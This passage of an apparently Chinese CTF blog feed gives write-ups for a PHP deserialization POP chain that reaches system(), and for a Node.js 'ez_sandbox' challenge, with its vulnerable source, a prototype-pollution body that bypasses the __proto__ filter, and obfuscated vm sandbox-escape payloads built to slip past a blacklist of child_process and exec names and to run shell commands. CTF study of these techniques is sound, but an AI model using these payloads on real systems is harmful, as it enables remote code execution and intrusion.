class="hljs-variable language_">$this</span>-&gt;funcs[<span class="hljs-variable">$name</span>](...<span class="hljs-variable">$args</span>);  <span class="hljs-comment">//system(&#x27;ls&#x27;)等？</span><br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataObject</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$storage</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;  <span class="hljs-comment">//链子的头</span><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;data <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<span class="hljs-comment">//遍历data数组，键key值value</span><br>            <span class="hljs-variable language_">$this</span>-&gt;storage-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<span class="hljs-comment">//将storage对象的$key属性赋值为$value,注意此时可以去触发Storage的__set方法.(给不可访问的属性赋值)</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>]);<span class="hljs-comment">//反序列化</span><br>&#125;<br><span class="hljs-meta">?&gt;</span> <br>    <br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cache</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$expired</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$helper</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Storage</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$store</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$funcs</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataObject</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$storage</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br>&#125;<br>    <br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataObject</span>();<br>    <span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Storage</span>();<br>    <span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cache</span>();<br>    <span class="hljs-variable">$c</span> -&gt; expired = False;<br>    <span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cache</span>();<br>    <span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>();<br>    <span class="hljs-variable">$a</span>-&gt; data = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;key1&#x27;</span> =&gt; <span class="hljs-variable">$c</span>, <span class="hljs-string">&#x27;key2&#x27;</span> =&gt; <span class="hljs-variable">$d</span>);<span class="hljs-comment">//放入Cache1和Cache2，两个实例</span><br>    <span class="hljs-variable">$a</span>-&gt; storage = <span class="hljs-variable">$b</span>; <span class="hljs-comment">//这里触发了Storage中的__set方法</span><br>    <span class="hljs-variable">$b</span>-&gt; store = &amp;<span class="hljs-variable">$d</span>-&gt;expired;<span class="hljs-comment">//通过引用赋值绕过__wakeup，store和$d指向相同的内存地址</span><br>    <span class="hljs-variable">$d</span> -&gt; key = <span class="hljs-string">&#x27;id&#x27;</span>;<br>    <span class="hljs-variable">$d</span>-&gt; helper = <span class="hljs-variable">$e</span>;<br>    <span class="hljs-variable">$e</span>-&gt; <span class="hljs-variable">$funcs</span> = [<span class="hljs-string">&#x27;clean&#x27;</span> =&gt; <span class="hljs-string">&#x27;system&#x27;</span>];<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><br><br>DataObject.__destruct<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span> Storage.__set<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span> Cache.expired<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span> Helper.__call()<br><br><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">参考文章:ttps:<span class="hljs-regexp">//</span>zhuanlan.zhihu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">377676274</span><br></code></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">pear:</span><br><span class="hljs-symbol">https:</span>//longlone.top/<span class="hljs-variable">%E5</span><span class="hljs-variable">%AE</span><span class="hljs-variable">%89</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%85</span><span class="hljs-variable">%A8</span>/<span class="hljs-variable">%E5</span><span class="hljs-variable">%AE</span><span class="hljs-variable">%89</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%85</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%E7</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%94</span><span class="hljs-variable">%E7</span><span class="hljs-variable">%A9</span><span class="hljs-variable">%B6</span>/register_argc_argv<span class="hljs-variable">%E4</span><span class="hljs-variable">%B8</span><span class="hljs-variable">%8</span>Einclude<span class="hljs-variable">%20</span><span class="hljs-keyword">to</span><span class="hljs-variable">%20</span>RCE<span class="hljs-variable">%E7</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%84</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%B7</span><span class="hljs-variable">%A7</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%A6</span><span class="hljs-variable">%99</span><span class="hljs-variable">%E7</span><span class="hljs-variable">%BB</span><span class="hljs-variable">%84</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%90</span><span class="hljs-variable">%88</span>/<br><span class="hljs-symbol">https:</span>//blog.csdn.net/RABCDXB/article/details/<span class="hljs-number">122050370</span><br><br></code></pre></td></tr></table></figure><h3 id="Week-2-ez-sandbox"><a href="#Week-2-ez-sandbox" class="headerlink" title="[Week 2] ez_sandbox"></a>[Week 2] ez_sandbox</h3><p><code>app.js</code>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>)<br><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><br><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><span class="hljs-keyword">const</span> session = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express-session&#x27;</span>)<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>)<br><br><span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>()<br><br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>())<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">session</span>(&#123;<br>    <span class="hljs-attr">secret</span>: crypto.<span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">64</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>),<br>    <span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">true</span><br>&#125;))<br><br><span class="hljs-keyword">var</span> users = &#123;&#125;<br><span class="hljs-keyword">var</span> admins = &#123;&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123; <span class="hljs-comment">//merge，原型链污染</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;<br>        <span class="hljs-keyword">if</span> (key === <span class="hljs-string">&#x27;__proto__&#x27;</span>) &#123;<span class="hljs-comment">//这里过滤了__protp__</span><br>            <span class="hljs-keyword">continue</span><span class="hljs-comment">//中断迭代，进入下一次循环</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>            <span class="hljs-title function_">merge</span>(target[key], source[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key]<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> target<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">clone</span>(<span class="hljs-params">source</span>) &#123; <span class="hljs-comment">//同上</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">merge</span>(&#123;&#125;, source)<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">code</span>) &#123;<br>    <span class="hljs-keyword">let</span> blacklist = [<span class="hljs-string">&#x27;constructor&#x27;</span>, <span class="hljs-string">&#x27;mainModule&#x27;</span>, <span class="hljs-string">&#x27;require&#x27;</span>, <span class="hljs-string">&#x27;child_process&#x27;</span>, <span class="hljs-string">&#x27;process&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;execSync&#x27;</span>, <span class="hljs-string">&#x27;execFile&#x27;</span>, <span class="hljs-string">&#x27;execFileSync&#x27;</span>, <span class="hljs-string">&#x27;spawn&#x27;</span>, <span class="hljs-string">&#x27;spawnSync&#x27;</span>, <span class="hljs-string">&#x27;fork&#x27;</span>]<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> v <span class="hljs-keyword">of</span> blacklist) &#123;<br>        <span class="hljs-keyword">if</span> (code.<span class="hljs-title function_">includes</span>(v)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(v + <span class="hljs-string">&#x27; is banned&#x27;</span>)<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">requireLogin</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>) &#123;<br>        res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/login&#x27;</span>)<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_">next</span>()<br>    &#125;<br>&#125;<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>) &#123;<br>        <span class="hljs-keyword">delete</span> <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>[key]<br>    &#125;<br>    <span class="hljs-title function_">next</span>()<br>&#125;)<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, requireLogin, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    res.<span class="hljs-title function_">sendFile</span>(__dirname + <span class="hljs-string">&#x27;/public/index.html&#x27;</span>)<br>&#125;)<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    res.<span class="hljs-title function_">sendFile</span>(__dirname + <span class="hljs-string">&#x27;/public/login.html&#x27;</span>)<br>&#125;)<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/register&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    res.<span class="hljs-title function_">sendFile</span>(__dirname + <span class="hljs-string">&#x27;/public/register.html&#x27;</span>)<br>&#125;)<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">let</span> &#123; username, password &#125; = <span class="hljs-title function_">clone</span>(req.<span class="hljs-property">body</span>)<br><br>    <span class="hljs-keyword">if</span> (username <span class="hljs-keyword">in</span> users &amp;&amp; password === users[username]) &#123;<br>        req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span> = username<br><br>        <span class="hljs-keyword">if</span> (username <span class="hljs-keyword">in</span> admins) &#123;<br>            req.<span class="hljs-property">session</span>.<span class="hljs-property">role</span> = <span class="hljs-string">&#x27;admin&#x27;</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            req.<span class="hljs-property">session</span>.<span class="hljs-property">role</span> = <span class="hljs-string">&#x27;guest&#x27;</span><br>        &#125;<br><br>        res.<span class="hljs-title function_">send</span>(&#123;<br>            <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;login success&#x27;</span><br>        &#125;)<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        res.<span class="hljs-title function_">send</span>(&#123;<br>            <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;login failed&#x27;</span><br>        &#125;)<br>    &#125;<br>&#125;)<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/register&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">let</span> &#123; username, password &#125; = <span class="hljs-title function_">clone</span>(req.<span class="hljs-property">body</span>)<br><br>    <span class="hljs-keyword">if</span> (username <span class="hljs-keyword">in</span> users) &#123;<br>        res.<span class="hljs-title function_">send</span>(&#123;<br>            <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;register failed&#x27;</span><br>        &#125;)<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        users[username] = password<br>        res.<span class="hljs-title function_">send</span>(&#123;<br>            <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;register success&#x27;</span><br>        &#125;)<br>    &#125;<br>&#125;)<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/profile&#x27;</span>, requireLogin, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    res.<span class="hljs-title function_">send</span>(&#123;<br>        <span class="hljs-string">&#x27;user&#x27;</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>,<br>        <span class="hljs-string">&#x27;role&#x27;</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">role</span><br>    &#125;)<br>&#125;)<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/sandbox&#x27;</span>, requireLogin, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">if</span> (req.<span class="hljs-property">session</span>.<span class="hljs-property">role</span> === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>        <span class="hljs-keyword">let</span> code = req.<span class="hljs-property">body</span>.<span class="hljs-property">code</span><br>        <span class="hljs-keyword">let</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>)<br>        <span class="hljs-keyword">let</span> context = vm.<span class="hljs-title function_">createContext</span>(sandbox)<br>        <br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-title function_">waf</span>(code)<br>            <span class="hljs-keyword">let</span> result = vm.<span class="hljs-title function_">runInContext</span>(code, context)<br>            res.<span class="hljs-title function_">send</span>(&#123;<br>                <span class="hljs-string">&#x27;result&#x27;</span>: result<br>            &#125;)<br>        &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>            res.<span class="hljs-title function_">send</span>(&#123;<br>                <span class="hljs-string">&#x27;result&#x27;</span>: e.<span class="hljs-property">message</span><br>            &#125;)<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        res.<span class="hljs-title function_">send</span>(&#123;<br>            <span class="hljs-string">&#x27;result&#x27;</span>: <span class="hljs-string">&#x27;Your role is not admin, so you can not run any code&#x27;</span><br>        &#125;)<br>    &#125;<br>&#125;)<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/logout&#x27;</span>, requireLogin, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    req.<span class="hljs-property">session</span>.<span class="hljs-title function_">destroy</span>()<br>    res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/login&#x27;</span>)<br>&#125;)<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;server start listening on :3000&#x27;</span>)<br>&#125;)<br></code></pre></td></tr></table></figure><p>先看和原型链污染有关的部分：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">let</span> &#123; username, password &#125; = <span class="hljs-title function_">clone</span>(req.<span class="hljs-property">body</span>) <span class="hljs-comment">//解构赋值，从req.body对象中提取username和password属性值，并将它们分别赋值给变量username和password。</span><br><br>    <span class="hljs-keyword">if</span> (username <span class="hljs-keyword">in</span> users &amp;&amp; password === users[username]) &#123;<br>        req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span> = username<br><br>        <span class="hljs-keyword">if</span> (username <span class="hljs-keyword">in</span> admins) &#123; <span class="hljs-comment">//目的是拿到admin角色</span><br>            req.<span class="hljs-property">session</span>.<span class="hljs-property">role</span> = <span class="hljs-string">&#x27;admin&#x27;</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            req.<span class="hljs-property">session</span>.<span class="hljs-property">role</span> = <span class="hljs-string">&#x27;guest&#x27;</span><br>        &#125;<br><span class="hljs-comment">//clone(req.body)看成merge(&#123;&#125;, req.body)。利用req.body污染admins即可</span><br></code></pre></td></tr></table></figure><p>在<code>POST</code>包中增加如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;123&quot;</span>,<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-string">&quot;123&quot;</span>&#125;&#125;&#125;<br><span class="hljs-comment">//__proto__被过滤，通过&quot;constructor&quot;: &#123;&quot;prototype&quot;: 绕过即可</span><br>&#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;123&quot;</span>,<span class="hljs-string">&quot;constructor&quot;</span>: &#123;<span class="hljs-string">&quot;prototype&quot;</span>: &#123;<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-string">&quot;123&quot;</span>&#125;&#125;&#125;<br><span class="hljs-comment">//存在admins.__proto__.test=123，username=&#x27;test&#x27;，使得username in admins成立</span><br></code></pre></td></tr></table></figure><p>结果：</p><p><img src="/img/sb2.png" alt="sb2"></p><p><code>payload:</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123;&#125;, &#123; <br><span class="hljs-attr">get</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123; <br><span class="hljs-keyword">const</span> c = <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>.<span class="hljs-property">caller</span><br><span class="hljs-keyword">const</span> p = (c[<span class="hljs-string">&#x27;constru&#x27;</span>+<span class="hljs-string">&#x27;ctor&#x27;</span>][<span class="hljs-string">&#x27;constru&#x27;</span>+<span class="hljs-string">&#x27;ctor&#x27;</span>](<span class="hljs-string">&#x27;return pro&#x27;</span>+<span class="hljs-string">&#x27;cess&#x27;</span>))()<br><span class="hljs-keyword">return</span> p[<span class="hljs-string">&#x27;mainM&#x27;</span>+<span class="hljs-string">&#x27;odule&#x27;</span>][<span class="hljs-string">&#x27;requi&#x27;</span>+<span class="hljs-string">&#x27;re&#x27;</span>](<span class="hljs-string">&#x27;child_pr&#x27;</span>+<span class="hljs-string">&#x27;ocess&#x27;</span>)[<span class="hljs-string">&#x27;ex&#x27;</span>+<span class="hljs-string">&#x27;ecSync&#x27;</span>](<span class="hljs-string">&#x27;ls /&#x27;</span>).<span class="hljs-title function_">toString</span>();<br> &#125;<br>&#125;)<br>或<br><span class="hljs-keyword">let</span> obj = &#123;&#125; <br>obj.<span class="hljs-title function_">__defineGetter__</span>(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-keyword">const</span> c = <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>.<span class="hljs-property">caller</span><br><span class="hljs-keyword">const</span> p = (c[<span class="hljs-string">&#x27;constru&#x27;</span>+<span class="hljs-string">&#x27;ctor&#x27;</span>][<span class="hljs-string">&#x27;constru&#x27;</span>+<span class="hljs-string">&#x27;ctor&#x27;</span>](<span class="hljs-string">&#x27;return pro&#x27;</span>+<span class="hljs-string">&#x27;cess&#x27;</span>))()<br><span class="hljs-keyword">return</span> p[<span class="hljs-string">&#x27;mainM&#x27;</span>+<span class="hljs-string">&#x27;odule&#x27;</span>][<span class="hljs-string">&#x27;requi&#x27;</span>+<span class="hljs-string">&#x27;re&#x27;</span>](<span class="hljs-string">&#x27;child_pr&#x27;</span>+<span class="hljs-string">&#x27;ocess&#x27;</span>)[<span class="hljs-string">&#x27;ex&#x27;</span>+<span class="hljs-string">&#x27;ecSync&#x27;</span>](<span class="hljs-string">&#x27;cat /flag&#x27;</span>).<span class="hljs-title function_">toString</span>();<br>&#125;)<br><span class="hljs-keyword">throw</span> obj<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LeetCode做题记录_1</title>
    <link href="/2023/09/19/2023-9-19-LeetCode%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_1/"/>
    <url>/2023/09/19/2023-9-19-LeetCode%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_1/</url>
    
